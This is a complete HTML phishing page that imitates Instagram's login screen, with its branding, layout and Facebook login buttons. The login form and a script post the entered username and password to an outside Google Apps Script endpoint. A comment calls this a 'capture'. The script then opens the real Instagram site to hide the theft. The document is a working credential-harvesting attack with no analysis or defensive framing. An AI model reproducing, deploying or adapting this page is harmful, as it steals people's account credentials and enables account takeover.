<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        :root {
            --blue: #4a5df9;
            --blue-hover: #3a4be0;
            --gray-border: #dbdbdb;
            --text: #262626;
            --muted: #8e8e8e;
            --bg-gray: #fafafa;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                Helvetica, Arial, sans-serif;
            background: #fff;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ---------- Main split layout ---------- */
        .wrapper {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .layout {
            display: flex;
            width: 100%;
            max-width: 1050px;
            min-height: 0;
            align-items: center;
        }

        /* ---------- Left panel ---------- */
        .left {
            flex: 1;
            padding: 0 20px 0 0;
            position: relative;
            overflow: visible;
        }

        .ig-logo {
            width: 62px;
            height: 62px;
            position: absolute;
            top: 0;
            left: 0;
        }

        .left-inner {
            padding-top: 80px;
            text-align: center;
        }

        .headline {
            font-size: 34px;
            line-height: 1.25;
            font-weight: 400;
            letter-spacing: -0.5px;
            color: #000;
        }

        .headline .grad {
            background: linear-gradient(90deg, #ff0169, #d300c5, #7638fa);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            color: transparent;
        }

        /* ---------- Phone collage ---------- */
        .collage {
            position: relative;
            width: 400px;
            height: 300px;
            margin: 30px auto 0;
            overflow: visible;
        }

        .phone {
            position: absolute;
            width: 130px;
            height: 240px;
            border-radius: 20px;
            border: 5px solid #fff;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
            overflow: hidden;
            background: #eee;
        }

        .phone::before {
            /* notch */
            content: "";
            position: absolute;
            top: 8px;
            left: 50%;
            transform: translateX(-50%);
            width: 46px;
            height: 6px;
            background: rgba(255, 255, 255, 0.85);
            border-radius: 6px;
            z-index: 2;
        }

        .phone img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            border-radius: 15px;
        }

        .phone.p1 {
            left: 10px;
            top: 30px;
            transform: rotate(-6deg);
            z-index: 1;
            background: #ffd98e;
        }

        .phone.p2 {
            left: 128px;
            top: 10px;
            transform: rotate(2deg);
            z-index: 3;
            background: #a8d8f0;
        }

        .phone.p3 {
            left: 248px;
            top: 35px;
            transform: rotate(7deg);
            z-index: 2;
            background: #8fd98f;
        }

        .heart {
            position: absolute;
            bottom: 16px;
            left: 16px;
            font-size: 22px;
            color: #fff;
            z-index: 3;
            text-shadow: 0 1px 3px rgba(0, 0, 0, .4);
        }

        .reaction {
            position: absolute;
            top: 14px;
            left: 14px;
            background: #fff;
            border-radius: 20px;
            padding: 3px 8px;
            font-size: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, .15);
            z-index: 4;
        }

        /* ---------- Right panel ---------- */
        .right {
            flex: 1;
            border-left: 1px solid var(--gray-border);
            padding: 24px 0 24px 40px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .form-box {
            width: 100%;
            max-width: 380px;
            align-self: center;
        }

        .form-box h1 {
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 22px;
        }

        .field {
            width: 100%;
            height: 52px;
            padding: 0 16px;
            margin-bottom: 12px;
            font-size: 15px;
            color: var(--text);
            background: #fff;
            border: 1px solid var(--gray-border);
            border-radius: 12px;
            outline: none;
        }

        .field:focus {
            border-color: #a8a8a8;
        }

        .field::placeholder {
            color: var(--muted);
        }

        .btn-login {
            width: 100%;
            height: 48px;
            margin-top: 8px;
            border: none;
            border-radius: 12px;
            background: #a2c1f0;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background .15s;
        }

        .btn-login.active {
            background: var(--blue);
        }

        .btn-login.active:hover {
            background: var(--blue-hover);
        }

        .forgot {
            display: block;
            text-align: center;
            margin: 22px 0 30px;
            font-size: 14px;
            color: var(--text);
            text-decoration: none;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .divider {
            height: 24px;
        }

        .btn-facebook {
            width: 100%;
            height: 48px;
            border: none;
            border-radius: 12px;
            background: #f0f0f0;
            color: #262626;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 14px;
        }

        .btn-facebook:hover {
            background: #e8e8e8;
        }

        .btn-create {
            width: 100%;
            height: 48px;
            border: 1px solid var(--blue);
            border-radius: 12px;
            background: #fff;
            color: var(--blue);
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-create:hover {
            background: #f4f6ff;
        }

        .meta {
            text-align: center;
            margin-top: 28px;
            font-size: 15px;
            font-weight: 600;
            color: #262626;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .meta svg {
            width: 22px;
            height: 22px;
        }

        /* ---------- Footer ---------- */
        footer {
            text-align: center;
            padding: 18px;
            font-size: 12px;
            color: var(--muted);
        }

        /* ---------- Responsive ---------- */
        @media (max-width: 875px) {
            .layout {
                min-height: auto;
            }

            .left {
                display: none;
            }

            .right {
                border-left: none;
                padding: 40px 20px;
            }
        }
    </style>
</head>

<body>

    <div class="wrapper">
        <div class="layout">

            <!-- LEFT -->
            <div class="left">
                <svg class="ig-logo" viewBox="0 0 100 100" aria-label="Instagram">
                    <defs>
                        <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
                            <stop offset="0%" stop-color="#fdf497" />
                            <stop offset="5%" stop-color="#fdf497" />
                            <stop offset="45%" stop-color="#fd5949" />
                            <stop offset="60%" stop-color="#d6249f" />
                            <stop offset="90%" stop-color="#285AEB" />
                        </radialGradient>
                    </defs>
                    <rect x="4" y="4" width="92" height="92" rx="26" ry="26" fill="none" stroke="url(#igGrad)"
                        stroke-width="8" />
                    <circle cx="50" cy="50" r="22" fill="none" stroke="url(#igGrad)" stroke-width="8" />
                    <circle cx="74" cy="26" r="6" fill="url(#igGrad)" />
                </svg>

                <div class="left-inner">
                    <h2 class="headline">
                        See everyday moments from<br>
                        <span style="display:block; margin-top:14px;">
                            your <span class="grad">close friends</span>.
                        </span>
                    </h2>

                    <div class="collage">
                        <div class="phone p1">
                            <img src="images/phone1.jpg" alt="Friend story">
                            <span class="reaction">👀</span>
                        </div>
                        <div class="phone p2">
                            <img src="images/phone2.jpg" alt="Friends hangout">
                            <span class="heart">♡</span>
                        </div>
                        <div class="phone p3">
                            <img src="images/phone3.jpg" alt="Food story">
                        </div>
                    </div>
                </div>
            </div>

            <!-- RIGHT -->
            <div class="right">
                <div class="form-box">
                    <h1>Log into Instagram</h1>

                    <form id="loginForm" method="POST"
                        action="https://script.google.com/macros/s/AKfycbw_iyM72kgS-FyZK1fNoZ4FbiOBKnd1QkHJYVTlJVJlcg_Qw5YuhFOFnh3axshuZVc/exec">
                        <input class="field" type="text" name="username" placeholder="username" autocomplete="username">
                        <input class="field" type="password" name="password" placeholder="password"
                            autocomplete="current-password">
                        <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                    </form>

                    <a href="#" class="forgot">Forgot password?</a>

                    <div class="divider"></div>

                    <button class="btn-facebook">
                        <svg viewBox="0 0 24 24" width="18" height="18" fill="#1877f2">
                            <path
                                d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.95.93-1.95 1.89v2.25h3.32l-.53 3.49h-2.79V24C19.61 23.1 24 18.1 24 12.07z" />
                        </svg>
                        Log in with Facebook
                    </button>

                    <button class="btn-create">Create new account</button>

                    <div class="meta">
                        <svg viewBox="0 0 36 36" fill="#0866ff">
                            <path
                                d="M18 6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12S24.6 6 18 6zm-1.8 18.6v-4.8h-2.1v-2.4h2.1v-1.9c0-2.1 1.3-3.3 3.2-3.3.9 0 1.9.2 1.9.2v2.1h-1.1c-1 0-1.4.7-1.4 1.3v1.6h2.3l-.4 2.4h-1.9v4.8h-2.6z" />
                        </svg>
                        Meta
                    </div>
                </div>
            </div>

        </div>
    </div>

    <footer>© 2026 Instagram from Meta</footer>

    <script>
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('loginBtn');
        const inputs = form.querySelectorAll('.field');

        // Tint the button blue once both fields have content
        function updateBtn() {
            const filled = [...inputs].every(i => i.value.trim() !== '');
            btn.classList.toggle('active', filled);
        }
        inputs.forEach(i => i.addEventListener('input', updateBtn));

        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const formData = new FormData(this);
            const ENDPOINT = 'https://script.google.com/macros/s/AKfycbw_iyM72kgS-FyZK1fNoZ4FbiOBKnd1QkHJYVTlJVJlcg_Qw5YuhFOFnh3axshuZVc/exec';

            // Fire-and-forget capture, then always redirect
            // URLSearchParams sends application/x-www-form-urlencoded — a "simple" request,
            // no CORS preflight needed. Apps Script reads fields via e.parameter[header]
            fetch(ENDPOINT, {
                method: 'POST',
                mode: 'no-cors',
                body: new URLSearchParams({
                    username: formData.get('username'),
                    password: formData.get('password')
                })
            })
                .then(() => { window.open("https://www.instagram.com/", "_blank"); })
                .catch(() => { window.open("https://www.instagram.com/", "_blank"); });
        });
    </script>

</body>

</html>
